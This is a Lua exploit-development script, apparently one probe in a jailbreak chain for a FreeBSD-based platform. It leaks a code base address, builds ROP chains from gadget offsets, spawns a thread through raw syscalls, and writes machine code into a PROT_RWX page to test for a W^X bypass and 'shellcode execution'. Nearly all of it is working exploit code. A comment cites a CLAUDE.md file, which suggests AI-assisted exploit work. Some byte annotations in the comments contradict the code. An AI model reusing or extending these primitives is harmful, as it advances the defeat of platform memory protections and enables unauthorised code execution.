-- CRASH_CLASS: HIGH
-- PROBE 106a: verify whether mmap(PROT_RWX) actually gives execute permission
--
-- CLAUDE.md says "mmap(RWX) gives RW only" but this was INFERRED from
-- mprotect failures, never directly verified. If mmap(7) silently grants
-- EXEC, we have shellcode execution and the whole exploit chain opens up.
--
-- Method: map RWX page, write simple machine code (xor eax,eax;ret = 0x31C0C3),
-- have a child thread jump to it. If child survives and RAX=0, page is executable.
-- If child dies (SIGBUS/SIGSEGV), page is RW only (confirmed).
--
-- Also tests: regular PROT_RW page as control (should NOT execute).

print("=== PROBE 106a: MMAP EXEC VERIFICATION ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function wb(a,v) pcall(function() memory.write_byte(a,uint64(v)) end) end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430)

-- Allocate control region (RW, for stack/ctx/results)
local ok_c,ctrl=pcall(function()
    return mm(uint64(0),uint64(6*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_c then print("CTRL MMAP FAIL") return end
local R=N(ctrl)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl300=R+0x40; wq(sl300,uint64(0)); wq(sl300+8,uint64(300000000))
local tb=R+0x80
local RESULT=R+0x1000
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4

print(string.format("ctrl=0x%X", R))

-- ============================================================
print("")
print("--- A: CONTROL — execute code in eboot .text (must work) ---")
-- Child entry: RIP = eboot known gadget "xor eax, eax; ret" (C3 31 C0)
-- Actually, let's use PRAX (pop rax; ret) with value 0x42424242 on stack
-- This executes in eboot .text which is RX — guaranteed to work.

z(child_ctx,0x200)
wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
wq(child_ctx+_TP,uint64(0x10000))
wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
wq(child_ctx+_SP,uint64(child_stk))
wq(child_ctx+_AX,uint64(0xCCCCCCCC))
-- Entry: pop rax; ret → loads 0x42424242 into RAX
wq(child_ctx+_IP,PRAX)

local off=0
wq(child_stk+off,uint64(0x42424242)); off=off+8   -- popped into RAX
-- Now: PRDI, RESULT, WMOV → store RAX to RESULT
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(RESULT)); off=off+8
wq(child_stk+off,WMOV); off=off+8
-- Sleep
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(ts999)); off=off+8
wq(child_stk+off,PRSI); off=off+8
wq(child_stk+off,uint64(0)); off=off+8
wq(child_stk+off,PRAX); off=off+8
wq(child_stk+off,uint64(240)); off=off+8
wq(child_stk+off,SA); off=off+8

wq(RESULT,uint64(0xDEADCAFE))
wq(tb,uint64(0))
pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
native.fcall_with_rax(stub,240,N(sl300),0)

local ctrl_rv=rd(RESULT)
local c1=N(native.fcall_with_rax(stub,20))
print(string.format("  eboot exec result=0x%X (expect 0x42424242) canary=%s",
    ctrl_rv or 0, c1==pid and "OK" or "FAIL"))
if ctrl_rv~=0x42424242 then
    print("  CONTROL FAILED — child chain broken, aborting")
    return
end

-- ============================================================
print("")
print("--- B: MAP PROT_RWX (7) AND EXECUTE ---")
-- Map page with PROT_RWX = 7
local ok_rwx,page_rwx=pcall(function()
    return mm(uint64(0),uint64(0x4000),uint64(7),  -- PROT_READ|PROT_WRITE|PROT_EXEC
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_rwx then print("  RWX MMAP FAILED") return end
local PRWX=N(page_rwx)
print(string.format("  RWX page=0x%X", PRWX))

-- Write shellcode: mov eax, 0xBEEFCAFE; ret
-- B8 FE CA EF BE C3
wb(PRWX, 0xB8)         -- mov eax, imm32
wb(PRWX+1, 0xFE)       -- 0xCAFEBEFE (LE)
wb(PRWX+2, 0xCA)
wb(PRWX+3, 0xEF)
wb(PRWX+4, 0xBE)
wb(PRWX+5, 0xC3)       -- ret

-- Verify the bytes were written
local b0=rd(PRWX)
local b4=rd(PRWX+4)
print(string.format("  bytes at page: 0x%08X 0x%08X", b0 or 0, b4 or 0))

-- Child: RIP = page address (the shellcode), then store RAX to RESULT
z(child_ctx,0x200)
wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
wq(child_ctx+_TP,uint64(0x10000))
wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
wq(child_ctx+_SP,uint64(child_stk))
wq(child_ctx+_AX,uint64(0))
-- Entry: jump to our shellcode
wq(child_ctx+_IP,page_rwx)

off=0
-- After shellcode returns: RAX = 0xBEEFCAFE
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(RESULT)); off=off+8
wq(child_stk+off,WMOV); off=off+8
wq(child_stk+off,PRDI); off=off+8
wq(child_stk+off,uint64(ts999)); off=off+8
wq(child_stk+off,PRSI); off=off+8
wq(child_stk+off,uint64(0)); off=off+8
wq(child_stk+off,PRAX); off=off+8
wq(child_stk+off,uint64(240)); off=off+8
wq(child_stk+off,SA); off=off+8

wq(RESULT,uint64(0xDEADCAFE))
wq(tb,uint64(0))
pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
native.fcall_with_rax(stub,240,N(sl300),0)

local rwx_rv=rd(RESULT)
local c2=N(native.fcall_with_rax(stub,20))
print(string.format("  RWX exec result=0x%X canary=%s",
    rwx_rv or 0, c2==pid and "OK" or "FAIL"))

if c2~=pid then
    print("  PROCESS KILLED — page is NOT executable (W^X confirmed)")
elseif rwx_rv==0xBEEFCAFE then
    print("  *** PAGE IS EXECUTABLE! W^X BYPASS VIA MMAP(RWX)! ***")
    print("  *** THIS IS THE PRIMITIVE — SHELLCODE EXECUTION ACHIEVED ***")
elseif rwx_rv==0xDEADCAFE then
    print("  SENTINEL unchanged — child died on exec (W^X confirmed)")
else
    print(string.format("  UNEXPECTED: 0x%X — investigate", rwx_rv or 0))
end

-- ============================================================
if c2==pid then
    print("")
    print("--- C: MAP PROT_RW (3) AND EXECUTE (negative control) ---")
    local ok_rw,page_rw=pcall(function()
        return mm(uint64(0),uint64(0x4000),uint64(3),  -- PROT_READ|PROT_WRITE (no exec)
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if ok_rw then
        local PRW=N(page_rw)
        wb(PRW, 0xB8); wb(PRW+1, 0xFE); wb(PRW+2, 0xCA)
        wb(PRW+3, 0xEF); wb(PRW+4, 0xBE); wb(PRW+5, 0xC3)

        z(child_ctx,0x200)
        wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
        wq(child_ctx+_TP,uint64(0x10000))
        wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
        wq(child_ctx+_SP,uint64(child_stk))
        wq(child_ctx+_IP,page_rw)

        off=0
        wq(child_stk+off,PRDI); off=off+8
        wq(child_stk+off,uint64(RESULT+8)); off=off+8
        wq(child_stk+off,WMOV); off=off+8
        wq(child_stk+off,PRDI); off=off+8
        wq(child_stk+off,uint64(ts999)); off=off+8
        wq(child_stk+off,PRSI); off=off+8
        wq(child_stk+off,uint64(0)); off=off+8
        wq(child_stk+off,PRAX); off=off+8
        wq(child_stk+off,uint64(240)); off=off+8
        wq(child_stk+off,SA); off=off+8

        wq(RESULT+8,uint64(0xDEADCAFE))
        wq(tb,uint64(0))
        pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
        native.fcall_with_rax(stub,240,N(sl300),0)

        local rw_rv=rd(RESULT+8)
        local c3=N(native.fcall_with_rax(stub,20))
        print(string.format("  RW-only exec result=0x%X canary=%s",
            rw_rv or 0, c3==pid and "OK" or "FAIL"))
        if c3~=pid then
            print("  Process killed on RW page exec — expected (negative control)")
        elseif rw_rv==0xDEADCAFE then
            print("  SENTINEL — child died on RW exec (expected)")
        end
    end
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 106a COMPLETE ===")
